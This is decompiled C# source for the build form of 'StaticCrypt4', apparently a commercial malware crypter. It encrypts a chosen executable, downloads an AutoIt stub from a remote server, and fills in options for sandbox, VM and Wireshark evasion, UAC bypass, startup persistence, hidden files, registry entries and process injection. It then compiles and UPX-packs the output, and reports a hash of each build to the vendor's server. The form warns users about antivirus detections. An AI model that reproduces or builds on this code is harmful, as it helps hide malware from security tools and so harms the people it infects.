using Bunifu.Framework.UI;
using Microsoft.VisualBasic;
using Properties;
using StaticCrypt4.Properties;
using StaticCrypt4.Utilies;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using WindowsFormsControlLibrary1;

namespace StaticCrypt4.Forms.Crypt
{
	public class BuildFrm : Form
	{
		private static string _username = "";

		public IContainer components;

		public BunifuCustomTextbox bunifuCustomTextbox1;

		public BunifuFlatButton bunifuFlatButton2;

		private RandomPool randomPool1;

		public BunifuCustomLabel bunifuCustomLabel2;

		public ChromeRadioButton chromeRadioButton1;

		public ChromeRadioButton chromeRadioButton2;

		public BunifuProgressBar bunifuProgressBar1;

		public BunifuCustomLabel bunifuCustomLabel5;

		public BunifuCheckbox bunifuCheckbox4;

		public BuildFrm()
		{
			InitializeComponent();
		}

		private void BuildFrm_Load(object sender, EventArgs e)
		{
			Helpers.EndOfTabs = true;
			Helpers.TabNumber = 5;
		}

		private void randomPool1_Click(object sender, EventArgs e)
		{
		}

		public void randomPool1_CharacterSelection(object s, char c)
		{
			if (bunifuCustomTextbox1.Text.Length < 82)
			{
				bunifuCustomTextbox1.AppendText(c.ToString());
			}
		}

		private void bunifuFlatButton2_Click(object sender, EventArgs e)
		{
			if (Call.cr1.bunifuTextbox1.text == "")
			{
				MessageBox.Show("You need to select a file that need to be crypted.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				try
				{
					int num = 0;
					num = (Call.bfrm.chromeRadioButton1.Checked ? 1 : 2);
					byte[] bytes = null;
					string path = FileUtils.StaticPath + "\\" + Utiles.RandomString(Utiles.Rng.Next(7, 12)) + "." + Utiles.RandomString(Utiles.Rng.Next(1, 3));
					string text20 = Utiles.RandomString(Utiles.Rng.Next(7, 12)) + "." + Utiles.RandomString(Utiles.Rng.Next(1, 3));
					if (StaticCrypt4.Utilies.Crypt.IsRequiertPacker)
					{
						string text = PackerNET.Start(Resources.StaticNETPack, File.ReadAllBytes(Call.cr1.bunifuTextbox1.text));
						if (text != "")
						{
							bytes = StaticCrypt4.Utilies.Crypt.EncryptData(text, num, bunifuCustomTextbox1.Text);
						}
					}
					else
					{
						bytes = StaticCrypt4.Utilies.Crypt.EncryptData(Call.cr1.bunifuTextbox1.text, num, bunifuCustomTextbox1.Text);
					}
					File.WriteAllBytes(path, bytes);
					using (WebClient webClient = new WebClient())
					{
						bunifuProgressBar1.Value += 10;
						bunifuProgressBar1.Update();
						string text2 = null;
						if (false)
						{
							try
							{
								text2 = Encoding.Default.GetString(Convert.FromBase64String(webClient.DownloadString(Utiles.StubWhiteListed)));
							}
							catch
							{
								text2 = Encoding.Default.GetString(Convert.FromBase64String(webClient.DownloadString(Utiles.StubWhiteListed)));
							}
						}
						else
						{
							text2 = Encoding.Default.GetString(Convert.FromBase64String(webClient.DownloadString(Utiles.StubWhiteListed)));
						}
						bunifuProgressBar1.Value += 20;
						bunifuProgressBar1.Update();
						if (Call.ccfrm.chromeRadioButton8.Checked)
						{
							text2 = text2.Replace("%CustomHeader%", Call.ccfrm.bunifuCustomTextbox1.Text);
							text2 = text2.Replace("%CustomDelay%", "");
							text2 = text2.Replace("%CustomBStartup%", "");
							text2 = text2.Replace("%CustomAStartup%", "");
						}
						else if (Call.ccfrm.chromeRadioButton4.Checked)
						{
							text2 = text2.Replace("%CustomHeader%", "");
							text2 = text2.Replace("%CustomDelay%", Call.ccfrm.bunifuCustomTextbox1.Text);
							text2 = text2.Replace("%CustomBStartup%", "");
							text2 = text2.Replace("%CustomAStartup%", "");
						}
						else if (Call.ccfrm.chromeRadioButton3.Checked)
						{
							text2 = text2.Replace("%CustomHeader%", "");
							text2 = text2.Replace("%CustomDelay%", "");
							text2 = text2.Replace("%CustomBStartup%", Call.ccfrm.bunifuCustomTextbox1.Text);
							text2 = text2.Replace("%CustomAStartup%", "");
						}
						else if (Call.ccfrm.chromeRadioButton2.Checked)
						{
							text2 = text2.Replace("%CustomHeader%", "");
							text2 = text2.Replace("%CustomDelay%", "");
							text2 = text2.Replace("%CustomBStartup%", "");
							text2 = text2.Replace("%CustomAStartup%", Call.ccfrm.bunifuCustomTextbox1.Text);
						}
						else
						{
							text2 = text2.Replace("%CustomHeader%", "");
							text2 = text2.Replace("%CustomDelay%", "");
							text2 = text2.Replace("%CustomBStartup%", "");
							text2 = text2.Replace("%CustomAStartup%", "");
						}
						string text3 = text2;
						bool @checked = Call.inj.bunifuCheckbox5.Checked;
						text2 = text3.Replace("%Sandboxie%", @checked.ToString());
						string text4 = text2;
						@checked = Call.inj.bunifuCheckbox6.Checked;
						text2 = text4.Replace("%VirtualMachin%", @checked.ToString());
						string text5 = text2;
						@checked = Call.inj.bunifuCheckbox7.Checked;
						text2 = text5.Replace("%Wireshark%", @checked.ToString());
						string text6 = text2;
						@checked = Call.inj.bunifuCheckbox2.Checked;
						text2 = text6.Replace("%Mutex%", @checked.ToString());
						text2 = text2.Replace("%MutexKey%", "\"" + Call.inj.bunifuCustomTextbox1.Text + "\"");
						string text7 = text2;
						@checked = Call.inj.bunifuCheckbox4.Checked;
						text2 = text7.Replace("%Delay%", @checked.ToString());
						text2 = text2.Replace("%DelayTime%", "\"" + Call.inj.bunifuCustomTextbox2.Text + "\"");
						string text8 = text2;
						@checked = Call.inj.chromeRadioButton10.Checked;
						text2 = text8.Replace("%AutoPump%", @checked.ToString());
						string text9 = text2;
						@checked = Call.inj.bunifuCheckbox3.Checked;
						text2 = text9.Replace("%UAC%", @checked.ToString());
						string text10 = text2;
						@checked = Call.ffrm.bunifuCheckbox5.Checked;
						text2 = text10.Replace("%Startup%", @checked.ToString());
						text2 = text2.Replace("%FilenameStartup%", "\"" + Call.ffrm.bunifuCustomTextbox3.Text + "\"");
						text2 = ((!(Call.ffrm.thirteenComboBox1.Text == "AppData")) ? ((!(Call.ffrm.thirteenComboBox1.Text == "ProgramData")) ? text2.Replace("%DirectoryStartup%", "@TempDir") : text2.Replace("%DirectoryStartup%", "@ProgramsCommonDir")) : text2.Replace("%DirectoryStartup%", "@AppDataDir"));
						text2 = text2.Replace("%FolderStartup%", "\"" + Call.ffrm.bunifuCustomTextbox3.Text + "\"");
						text2 = text2.Replace("%StartupExtension%", "\"" + Call.ffrm.thirteenComboBox2.Text + "\"");
						string text11 = text2;
						@checked = Call.ffrm.bunifuCheckbox9.Checked;
						text2 = text11.Replace("%ZoneID%", @checked.ToString());
						string text12 = text2;
						@checked = Call.ffrm.bunifuCheckbox1.Checked;
						text2 = text12.Replace("%HideFolder%", @checked.ToString());
						string text13 = text2;
						@checked = Call.ffrm.bunifuCheckbox2.Checked;
						text2 = text13.Replace("%HideFile%", @checked.ToString());
						string text14 = text2;
						@checked = Call.ffrm.chromeRadioButton4.Checked;
						text2 = text14.Replace("%Shortcut%", @checked.ToString());
						text2 = text2.Replace("%RegistryName%", "\"" + Call.ffrm.bunifuCustomTextbox1.Text + "\"");
						string text15 = text2;
						@checked = Call.ffrm.bunifuCheckbox3.Checked;
						text2 = text15.Replace("%StartupBak%", @checked.ToString());
						text2 = ((!(Call.ffrm.thirteenComboBox3.Text == "AppData")) ? ((!(Call.ffrm.thirteenComboBox3.Text == "ProgramData")) ? text2.Replace("%DirectoryBak%", "@TempDir") : text2.Replace("%DirectoryBak%", "@ProgramsCommonDir")) : text2.Replace("%DirectoryBak%", "@AppDataDir"));
						text2 = text2.Replace("%FilenameBak%", "\"" + Call.ffrm.bunifuCustomTextbox4.Text + "\"");
						text2 = text2.Replace("%RegistryBakName%", "\"" + Utiles.RandomString(Utiles.Rng.Next(1, 10)) + "\"");
						string text16 = text2;
						@checked = Call.ffrm.bunifuCheckbox4.Checked;
						text2 = text16.Replace("%ExitAtFirst%", @checked.ToString());
						text2 = text2.Replace("%EAFPATH%", "\"" + Utiles.RandomString(Utiles.Rng.Next(1, 10)) + "\"");
						text2 = text2.Replace("%PEFilename%", "\"" + Utiles.RandomString(Utiles.Rng.Next(1, 10)) + "." + Utiles.RandomString(Utiles.Rng.Next(1, 3)) + "\"");
						text2 = text2.Replace("FileInstall(%DataPE%", "FileInstall(\"" + Path.GetFileName(path) + "\"");
						text2 = text2.Replace("%ReplaceForInject%", StaticCrypt4.Utilies.Crypt.InjectPath);
						string text17 = text2;
						@checked = Call.inj.bunifuCheckbox1.Checked;
						text2 = text17.Replace("%Persistence%", @checked.ToString());
						text2 = text2.Replace("%EncryptionKey%", "\"" + bunifuCustomTextbox1.Text + "\"");
						text2 = text2.Replace("%NETUnmap%", "0");
						string text18 = text2;
						@checked = Call.bfrm.chromeRadioButton1.Checked;
						text2 = text18.Replace("%Xor%", @checked.ToString());
						string text19 = FileUtils.StaticPath + "\\Stub.au3";
						File.WriteAllText(text19, text2);
						bunifuProgressBar1.Value += 30;
						bunifuProgressBar1.Update();
						using (SaveFileDialog saveFileDialog = new SaveFileDialog())
						{
							saveFileDialog.Filter = "PE File | *.exe";
							if (saveFileDialog.ShowDialog() == DialogResult.OK)
							{
								bunifuProgressBar1.Value += 20;
								bunifuProgressBar1.Update();
								File.WriteAllBytes(FileUtils.StaticPath + "\\Aut2exe.exe", Resources.Aut2exe);
								File.WriteAllBytes(FileUtils.StaticPath + "\\upx.exe", Resources.upx);
								StaticCrypt4.Utilies.Crypt.Compile(FileUtils.StaticPath + "\\Aut2exe.exe", text19, saveFileDialog.FileName, Call.cr1.bunifuTextbox2.text, bunifuCheckbox4.Checked);
								bunifuProgressBar1.Value += 20;
								bunifuProgressBar1.Update();
								MessageBox.Show("Your file has been crypted succefuly, it was save as :\n" + saveFileDialog.FileName);
								bunifuProgressBar1.Value = 0;
								bunifuProgressBar1.Update();
								try
								{
									object[] obj2 = new object[12];
									char c = Strings.Chr(10);
									obj2[0] = c.ToString();
									obj2[1] = Utiles.SealUsername;
									obj2[2] = " | Date : ";
									DateTime now = DateTime.Now;
									obj2[3] = now.Date;
									obj2[4] = " / ";
									now = DateTime.Now;
									obj2[5] = now.Hour;
									obj2[6] = ":";
									now = DateTime.Now;
									obj2[7] = now.Minute;
									obj2[8] = " SHA256 : ";
									c = Strings.Chr(34);
									obj2[9] = c.ToString();
									obj2[10] = Utiles.hash_generator("md5", saveFileDialog.FileName);
									c = Strings.Chr(34);
									obj2[11] = c.ToString();
									string str = string.Concat(obj2);
									WebRequest.Create("http://staticsoftwares.pro/getsha.php?w=" + str).GetResponse();
								}
								catch
								{
								}
							}
							else
							{
								bunifuProgressBar1.Value = 0;
								bunifuProgressBar1.Update();
							}
						}
						FileUtils.ClearDir(FileUtils.StaticPath);
					}
				}
				catch
				{
				}
			}
		}

		private static bool IsBlackListed()
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					if (Array.Exists(webClient.DownloadString("http://staticsoftwares.pro/blacklist.txt").Split(';'), (string name) => name == _username))
					{
						return true;
					}
					return false;
				}
			}
			catch
			{
				return false;
			}
		}

		private void bunifuCheckbox4_OnChange(object sender, EventArgs e)
		{
			if (bunifuCheckbox4.Checked)
			{
				MessageBox.Show("This may create some detections, make sure to not contact the support about detection if you check that.", "Static Crypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		public void InitializeComponent()
		{
			bunifuCustomTextbox1 = new BunifuCustomTextbox();
			bunifuFlatButton2 = new BunifuFlatButton();
			bunifuCustomLabel2 = new BunifuCustomLabel();
			bunifuProgressBar1 = new BunifuProgressBar();
			bunifuCustomLabel5 = new BunifuCustomLabel();
			bunifuCheckbox4 = new BunifuCheckbox();
			chromeRadioButton2 = new ChromeRadioButton();
			chromeRadioButton1 = new ChromeRadioButton();
			randomPool1 = new RandomPool();
			base.SuspendLayout();
			bunifuCustomTextbox1.BorderColor = Color.SeaGreen;
			bunifuCustomTextbox1.BorderStyle = BorderStyle.FixedSingle;
			bunifuCustomTextbox1.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomTextbox1.Location = new Point(11, 226);
			bunifuCustomTextbox1.Multiline = true;
			bunifuCustomTextbox1.Name = "bunifuCustomTextbox1";
			bunifuCustomTextbox1.Size = new Size(686, 23);
			bunifuCustomTextbox1.TabIndex = 27;
			bunifuCustomTextbox1.TextAlign = HorizontalAlignment.Center;
			bunifuFlatButton2.Activecolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.BackColor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.BackgroundImageLayout = ImageLayout.Stretch;
			bunifuFlatButton2.BorderRadius = 0;
			bunifuFlatButton2.ButtonText = " Crypt";
			bunifuFlatButton2.Cursor = Cursors.Hand;
			bunifuFlatButton2.Iconcolor = Color.Transparent;
//			bunifuFlatButton2.Iconimage = Resources._null;
			bunifuFlatButton2.Iconimage_right = null;
			bunifuFlatButton2.Iconimage_right_Selected = null;
			bunifuFlatButton2.Iconimage_Selected = null;
			bunifuFlatButton2.IconZoom = 1300.0;
			bunifuFlatButton2.IsTab = false;
			bunifuFlatButton2.Location = new Point(12, 329);
			bunifuFlatButton2.Name = "bunifuFlatButton2";
			bunifuFlatButton2.Normalcolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.OnHovercolor = Color.FromArgb(23, 27, 35);
			bunifuFlatButton2.OnHoverTextColor = Color.White;
			bunifuFlatButton2.selected = false;
			bunifuFlatButton2.Size = new Size(685, 29);
			bunifuFlatButton2.TabIndex = 63;
			bunifuFlatButton2.Textcolor = Color.White;
			bunifuFlatButton2.TextFont = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuFlatButton2.Click += bunifuFlatButton2_Click;
			bunifuCustomLabel2.AutoSize = true;
			bunifuCustomLabel2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel2.Location = new Point(15, 267);
			bunifuCustomLabel2.Name = "bunifuCustomLabel2";
			bunifuCustomLabel2.Size = new Size(139, 16);
			bunifuCustomLabel2.TabIndex = 66;
			bunifuCustomLabel2.Text = "Encryption Algorithm : ";
			bunifuProgressBar1.BackColor = Color.Silver;
			bunifuProgressBar1.BorderRadius = 5;
			bunifuProgressBar1.Location = new Point(11, 306);
			bunifuProgressBar1.MaximumValue = 100;
			bunifuProgressBar1.Name = "bunifuProgressBar1";
			bunifuProgressBar1.ProgressColor = Color.SeaGreen;
			bunifuProgressBar1.Size = new Size(686, 10);
			bunifuProgressBar1.TabIndex = 28;
			bunifuProgressBar1.Value = 0;
			bunifuCustomLabel5.AutoSize = true;
			bunifuCustomLabel5.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
			bunifuCustomLabel5.Location = new Point(318, 267);
			bunifuCustomLabel5.Name = "bunifuCustomLabel5";
			bunifuCustomLabel5.Size = new Size(287, 16);
			bunifuCustomLabel5.TabIndex = 70;
			bunifuCustomLabel5.Text = "Compress With UPX (reduce the size by 400kb)";
			bunifuCheckbox4.BackColor = Color.SeaGreen;
			bunifuCheckbox4.ChechedOffColor = Color.SeaGreen;
			bunifuCheckbox4.Checked = false;
			bunifuCheckbox4.CheckedOnColor = Color.SeaGreen;
			bunifuCheckbox4.ForeColor = Color.White;
			bunifuCheckbox4.Location = new Point(292, 265);
			bunifuCheckbox4.Name = "bunifuCheckbox4";
			bunifuCheckbox4.Size = new Size(20, 20);
			bunifuCheckbox4.TabIndex = 69;
			bunifuCheckbox4.OnChange += bunifuCheckbox4_OnChange;
			chromeRadioButton2.Checked = false;
			chromeRadioButton2.Customization = "AAAA////////////AAAA/wAAAP8=";
			chromeRadioButton2.Field = 23;
			chromeRadioButton2.Font = new Font("Microsoft Sans Serif", 9.75f);
			chromeRadioButton2.Image = null;
			chromeRadioButton2.Location = new Point(218, 265);
			chromeRadioButton2.Name = "chromeRadioButton2";
			chromeRadioButton2.NoRounding = false;
			chromeRadioButton2.Size = new Size(66, 23);
			chromeRadioButton2.TabIndex = 68;
			chromeRadioButton2.Text = "RC4";
			chromeRadioButton2.Transparent = false;
			chromeRadioButton1.Checked = false;
			chromeRadioButton1.Customization = "AAAA////////////AAAA/wAAAP8=";
			chromeRadioButton1.Field = 23;
			chromeRadioButton1.Font = new Font("Microsoft Sans Serif", 9.75f);
			chromeRadioButton1.Image = null;
			chromeRadioButton1.Location = new Point(159, 265);
			chromeRadioButton1.Name = "chromeRadioButton1";
			chromeRadioButton1.NoRounding = false;
			chromeRadioButton1.Size = new Size(57, 23);
			chromeRadioButton1.TabIndex = 67;
			chromeRadioButton1.Text = "Xor";
			chromeRadioButton1.Transparent = false;
			randomPool1.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			randomPool1.Image = null;
			randomPool1.Location = new Point(11, 10);
			randomPool1.Name = "randomPool1";
			randomPool1.NoRounding = false;
			randomPool1.Range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			randomPool1.RangePadding = 2;
			randomPool1.Size = new Size(686, 206);
			randomPool1.TabIndex = 0;
			randomPool1.Text = "randomPool1";
			randomPool1.CharacterSelection += randomPool1_CharacterSelection;
			randomPool1.Click += randomPool1_Click;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			BackColor = Color.White;
			base.ClientSize = new Size(710, 370);
			base.Controls.Add(bunifuCustomLabel5);
			base.Controls.Add(bunifuCheckbox4);
			base.Controls.Add(chromeRadioButton2);
			base.Controls.Add(chromeRadioButton1);
			base.Controls.Add(bunifuCustomLabel2);
			base.Controls.Add(bunifuFlatButton2);
			base.Controls.Add(bunifuProgressBar1);
			base.Controls.Add(bunifuCustomTextbox1);
			base.Controls.Add(randomPool1);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "BuildFrm";
			Text = "BuildFrm";
			base.Load += BuildFrm_Load;
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
